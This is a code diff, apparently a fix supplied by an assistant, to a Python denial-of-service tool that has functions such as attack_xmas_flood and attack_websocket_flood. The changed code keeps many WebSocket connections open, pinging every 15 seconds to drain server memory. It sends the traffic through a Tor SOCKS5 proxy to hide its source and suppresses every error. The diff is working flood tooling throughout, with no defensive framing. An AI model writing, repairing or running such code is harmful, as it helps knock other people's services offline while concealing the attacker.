@@ -787,45 +787,55 @@ def attack_xmas_flood(target_url, port, duration, stop_event, pause_event, threa
     stop_event.set()
 
 
-# --- NEW: WebSocket Flood ---
+# This is the async worker. It's fine as it is.
 async def websocket_worker_async(stop_event, pause_event, target_uri, proxy_opts):
-    """
-    Asynchronous worker that establishes and maintains a WebSocket connection.
-    It sends periodic pings to keep the connection alive, consuming server memory.
-    """
-    # The websockets library uses a URI format like "ws://example.com/chat"
-    # or "wss://example.com/socket" for secure connections.
     try:
-        # The library handles SOCKS proxies via the `socks` parameter.
+        # The 'sock' parameter is the correct way to pass a pre-configured PySocks socket
         async with websockets.connect(target_uri, sock=proxy_opts) as websocket:
             while not stop_event.is_set():
                 if pause_event.is_set():
                     await asyncio.sleep(1)
                     continue
                 try:
-                    # Send a ping every 15 seconds to keep the connection alive.
                     await websocket.ping()
                     await asyncio.sleep(15)
                 except websockets.ConnectionClosed:
-                    break  # Connection was closed by server, exit the loop
+                    break
     except Exception:
-        # Silently handle connection errors (e.g., target is down, handshake fails)
-        pass
+        pass  # Silently handle any connection errors
 
 
+# THIS IS THE ONLY FUNCTION YOU NEED TO REPLACE
 def websocket_worker_sync_wrapper(stop_event, pause_event, target_uri, use_proxy):
     """
-    A synchronous wrapper to run the async websocket worker in a standard thread.
+    A synchronous wrapper to run the async websocket worker.
+    This version handles exceptions gracefully.
     """
-    proxy_opts = None
-    if use_proxy:
-        # The websockets library needs the proxy details passed in this format
-        proxy = socks.socksocket()
-        proxy.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-        proxy_opts = proxy
+    proxy_socket = None
+    try:
+        if use_proxy:
+            # The 'websockets' library needs a connected socket for the proxy
+            # We must connect it here in the synchronous part
+            host = websockets.uri.parse_uri(target_uri).host
+            port = websockets.uri.parse_uri(target_uri).port
 
-    # Run the async function until it completes
-    asyncio.run(websocket_worker_async(stop_event, pause_event, target_uri, proxy_opts))
+            proxy_socket = socks.socksocket()
+            proxy_socket.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            proxy_socket.settimeout(20)
+            proxy_socket.connect((host, port))
+
+        # asyncio.run() is the modern and correct way to call an async function
+        # from a sync context. We pass the already-connected proxy socket.
+        asyncio.run(websocket_worker_async(stop_event, pause_event, target_uri, proxy_socket))
+
+    except Exception:
+        # If any part of the setup fails (e.g., the proxy connection),
+        # this worker thread will simply terminate without crashing the program.
+        pass
+    finally:
+        # Ensure the socket is closed if it was created
+        if proxy_socket:
+            proxy_socket.close()
 
 
 def attack_websocket_flood(target_domain, path, port, duration, stop_event, pause_event, sockets=100, use_proxy=False):
